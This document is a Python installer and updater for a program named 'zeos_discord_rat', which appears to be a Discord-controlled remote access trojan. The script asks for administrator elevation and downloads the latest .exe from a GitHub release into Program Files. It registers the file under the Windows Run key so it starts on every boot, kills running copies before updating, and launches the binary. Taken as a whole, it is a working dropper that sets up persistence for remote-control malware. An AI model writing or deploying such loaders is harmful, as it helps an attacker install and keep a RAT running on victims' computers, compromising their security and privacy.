import ctypes
import json
import os
import subprocess
import sys
import urllib.request
import winreg

# ==========================================
# CONFIGURATION - Set your repo details here
# ==========================================
GITHUB_OWNER = "TaherMustansir1929"
GITHUB_REPO = "zeos_discord_rat"
APP_NAME = "zeos_discord_rat"  # Folder name in Program Files & Startup entry key
EXE_NAME = "zeos_discord_rat.exe"  # Target executable file name

# Paths
PROGRAM_FILES = os.environ.get("ProgramFiles", r"C:\Program Files")
INSTALL_DIR = os.path.join(PROGRAM_FILES, APP_NAME)
TARGET_EXE_PATH = os.path.join(INSTALL_DIR, EXE_NAME)
VERSION_FILE_PATH = os.path.join(INSTALL_DIR, "version.json")
STARTUP_REG_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"


def is_admin():
    """Check if the current script is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


def run_as_admin():
    """Relaunch the script with UAC elevation if not already running as Admin."""
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(
            None,
            "runas",
            sys.executable,
            " ".join(f'"{arg}"' for arg in sys.argv),
            None,
            1,
        )
        sys.exit(0)


def get_latest_github_release():
    """Fetch release metadata and download URL from GitHub API."""
    url = f"https://api.github.com/repos/{GITHUB_OWNER}/{GITHUB_REPO}/releases/latest"
    req = urllib.request.Request(
        url, headers={"User-Agent": "Windows-Installer-Script"}
    )
    with urllib.request.urlopen(req) as response:
        if response.status == 200:
            data = json.loads(response.read().decode("utf-8"))
            tag_name = data.get("tag_name", "").lstrip("v")
            assets = data.get("assets", [])
            download_url = None

            # Find the first asset ending with .exe
            for asset in assets:
                if asset.get("name", "").endswith(".exe"):
                    download_url = asset.get("browser_download_url")
                    break

            if not download_url:
                raise RuntimeError("No .exe asset found in the latest GitHub release.")

            return tag_name, download_url

    raise RuntimeError("Failed to query GitHub API.")


def get_installed_version():
    """Read the installed version from local metadata."""
    if os.path.exists(VERSION_FILE_PATH):
        try:
            with open(VERSION_FILE_PATH, "r", encoding="utf-8") as f:
                return json.load(f).get("version")
        except Exception:
            return None
    return None


def save_installed_version(version_str):
    """Save the current installed version to disk."""
    with open(VERSION_FILE_PATH, "w", encoding="utf-8") as f:
        json.dump({"version": version_str}, f)


def download_file(url, destination_path):
    """Download binary from GitHub and save to destination."""
    os.makedirs(os.path.dirname(destination_path), exist_ok=True)
    req = urllib.request.Request(
        url, headers={"User-Agent": "Windows-Installer-Script"}
    )
    with (
        urllib.request.urlopen(req) as response,
        open(destination_path, "wb") as out_file,
    ):
        out_file.write(response.read())


def add_to_startup(app_name, exe_path):
    """Add executable path to Current User Windows Startup Registry key."""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, STARTUP_REG_KEY, 0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Warning: Failed to add to registry startup: {e}")


def terminate_running_app(exe_name):
    """Kill running instances to unlock file before overwriting."""
    subprocess.run(["taskkill", "/F", "/IM", exe_name], capture_output=True)


def launch_installed_program(exe_path):
    """Launch installed application in a non-blocking process."""
    subprocess.Popen([exe_path], shell=True)


def main():
    # Enforce admin execution for writing to C:\Program Files
    run_as_admin()

    print(f"Checking GitHub for latest release of {APP_NAME}...")
    try:
        latest_version, download_url = get_latest_github_release()
    except Exception as e:
        print(f"Error fetching release info: {e}")
        return

    installed_version = get_installed_version()
    is_installed = os.path.exists(TARGET_EXE_PATH)

    # 1. First Time Run / Not Installed
    if not is_installed:
        print(f"Installing {APP_NAME} v{latest_version} into {INSTALL_DIR}...")
        download_file(download_url, TARGET_EXE_PATH)
        save_installed_version(latest_version)
        add_to_startup(APP_NAME, TARGET_EXE_PATH)
        print("Installation complete. Launching program...")
        launch_installed_program(TARGET_EXE_PATH)
        return

    # 2. Installed, but version mismatch
    if installed_version != latest_version:
        print(
            f"Updating {APP_NAME} (Current: v{installed_version} -> Latest: v{latest_version})..."
        )
        terminate_running_app(EXE_NAME)
        download_file(download_url, TARGET_EXE_PATH)
        save_installed_version(latest_version)
        add_to_startup(APP_NAME, TARGET_EXE_PATH)
        print("Update complete.")
        return

    # 3. Installed and already up to date
    print(
        f"{APP_NAME} is already at the latest version (v{installed_version}). No action required."
    )


if __name__ == "__main__":
    main()
